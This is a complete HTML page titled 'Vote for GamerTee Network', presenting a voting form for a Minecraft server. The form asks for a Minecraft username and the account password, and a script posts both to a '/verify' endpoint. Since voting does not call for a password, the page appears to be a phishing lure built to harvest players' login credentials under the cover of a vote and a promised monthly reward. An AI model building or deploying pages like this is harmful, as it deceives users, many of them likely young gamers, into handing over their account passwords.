<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vote for GamerTee Network</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      background-color: #e9ecef;
      margin: 0;
      padding: 0;
    }
    .vote-container {
      max-width: 600px;
      margin: 50px auto;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      padding: 30px;
    }
    h1 {
      text-align: center;
      color: red;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .checkbox-group {
      margin-bottom: 20px;
    }
    .checkbox-group input {
      margin-right: 10px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #218838;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="vote-container">
    <h1>Vote for GamerTee Network</h1>
    <form id="voteForm">
      <label for="username">Minecraft Username</label>
      <input type="text" id="username" name="username" placeholder="Enter your username" required />

      <label for="password">Minecraft Password</label>
      <input type="password" id="password" name="password" placeholder="Enter your server password" required />

      <div class="checkbox-group">
        <label>
          <input type="checkbox" required />
          I agree to the privacy policy
        </label>
      </div>

      <button type="submit">Submit Vote</button>
    </form>
    <div class="footer">
      Top voters are rewarded monthly!
    </div>
  </div>

  <script>
    document.getElementById("voteForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      fetch("/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      })
      .then(res => res.json())
      .then(data => {
        alert(data.message);
      });
    });
  </script>
</body>
</html>
